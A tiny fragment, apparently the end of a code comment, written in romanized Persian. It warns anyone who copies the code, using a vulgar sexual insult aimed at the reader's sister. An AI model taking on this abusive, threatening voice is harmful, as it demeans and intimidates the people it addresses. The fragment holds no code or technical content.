❌befahmam copy kardi khahareto migam...*/
